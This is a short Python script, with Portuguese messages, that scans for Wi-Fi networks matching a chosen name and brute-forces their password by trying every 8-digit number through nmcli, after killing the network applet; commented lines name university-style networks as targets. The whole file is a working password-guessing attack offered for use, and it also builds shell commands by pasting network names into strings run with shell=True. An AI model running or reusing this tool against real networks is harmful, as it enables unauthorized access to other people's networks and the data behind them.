import os
import subprocess


def run(interface_name, server_name):

        command = """sudo iwlist %s scan | grep -ioE 'ssid:"(.*%s.*)'""" %(interface_name, server_name)
        result = os.popen(command)
        result = list(result)
        ssid_list = [item.lstrip('SSID:').strip('"\n') for item in result]

        if(not ssid_list):
            print("Nenhum servidor com o nome \"" + server_name + "\" encontrado.\n")
            return None

        password = connect(interface_name, server_name)
        return password


def connect(interface_name, server_name):

    os.system("killall -9 nm-applet")
    print("")

    password = None
    result = None

    for i in range(0, 100000000):
        password = str(i)
        password = password.zfill(8)
        print("Teste para a seguinte senha: " + password)

        try:
            command = "nmcli d wifi connect %s password %s " %(server_name, password)
            result = subprocess.check_output(command, shell=True)

        except:
            continue

        else:
            if(result is None):
                print("alohinhas")
                continue
            if("fail" in result.lower() or "error" in result.lower()): continue
            break

    return password



if __name__ == "__main__":
    print("")

    interface_name = "wlp3s0"
    server_name = "Seguranca"
    #server_name = "USPnet"
    #server_name = "GrIA"

    password = run(interface_name, server_name)
    if(password is not None): print("Senha encontrada: " + password + "\n")
